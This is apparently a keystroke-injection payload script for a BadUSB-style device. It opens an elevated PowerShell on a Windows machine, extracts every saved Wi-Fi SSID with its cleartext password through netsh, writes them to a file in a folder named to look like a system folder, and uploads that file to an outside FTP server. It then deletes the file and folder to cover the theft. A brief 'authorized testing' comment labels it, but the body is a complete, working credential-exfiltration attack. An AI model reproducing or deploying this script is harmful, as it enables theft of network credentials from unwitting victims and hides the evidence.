// This script automates the exfiltration of Wi-Fi credentials from a Windows machine.
// It performs the following actions:
// 1. Opens PowerShell with administrative privileges.
// 2. Enumerates all saved Wi-Fi profiles and extracts their SSIDs and passwords.
// 3. Attempts to upload this file to a specified FTP server (anonymous login to 'public' directory).
// 5. Cleans up the created file and directory on the target system.
// This script is intended for educational and authorized testing purposes only.

layout('us');			// US keyboard layout
typingSpeed(1,1)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

press("GUI r");
delay(500);
type("powershell")
delay(500);
press("CONTROL SHIFT ENTER");
delay(1000);
press("LEFT");
delay(500);
press("ENTER");
delay(2000);

type("$wifiData = \"\"");
press("SHIFT ENTER"); // New line without executing
delay(100);

// Line 2: Start ForEach-Object loop for profiles
type("netsh wlan show profiles | ForEach-Object {");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 3: Indented - if condition to match profile names
press("TAB");
type("if ($_ -match 'All User Profile\\s+:\\s(.*)') {");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 4: Indented - Store SSID
press("TAB"); press("TAB"); // Double indent
type("$ssid = $matches[1].Trim()");
press("SHIFT ENTER"); // New line without executing
delay(100);

// Line 5: Indented - Get profile details (key=clear)
press("TAB"); press("TAB"); // Double indent
type("$profileDetails = netsh wlan show profile name=\"$ssid\" key=clear");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 6: Indented - Extract password from profile details
press("TAB"); press("TAB"); // Double indent
type("$password = $profileDetails | Select-String -Pattern 'Key Content' | ForEach-Object { $_.ToString().Split(':')[1].Trim() }");
press("SHIFT ENTER"); // New line without executing
delay(100);

// Line 7: Indented - If password found
press("TAB"); press("TAB"); // Double indent
type("if ($password) {");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 8: Indented - Append SSID and password to $wifiData
press("TAB"); press("TAB"); press("TAB"); // Triple indent
type("$wifiData += \"SSID: $ssid`nPassword: $password`n`n\"");
press("SHIFT ENTER"); // New line without executing
delay(100);

// Line 9: Close inner if block
press("TAB"); press("TAB"); // Double indent
type("}");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 10: Close outer if block
press("TAB"); // Single indent
type("}");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 11: Close ForEach-Object block
type("}");
press("SHIFT ENTER"); // New line without executing
delay(100);
 
// Line 12: Output collected data to a file
type("New-Item -Path \"C:\\SysProg32\" -ItemType Directory -Force");
press("SHIFT ENTER"); // EXECUTE the entire multi-line script
type("$wifiData | Out-File -FilePath \"C:\\SysProg32\\wifi_keys.txt\"");
press("ENTER"); // EXECUTE the entire multi-line script
delay(1500); // Give time for the script to execute and write the file

// Upload file to FTP server
type("ftp <ftp server ip>");
press("ENTER");
delay(500);
type("anonymous");
delay(500);
press("ENTER");
press("ENTER");
type("cd public");
delay(500);
press("ENTER");
type("put \"C:\\SysProg32\\wifi_keys.txt\" wifi_keys.txt");
press("ENTER");
delay(5000);
type("quit");
press("ENTER");
delay(500);
type("Remove-Item -Path \"C:\\SysProg32\\wifi_keys.txt\", \"C:\\SysProg32\" -Recurse -Force -ErrorAction SilentlyContinue\n");
delay(500);
type("exit\n");
delay(500);
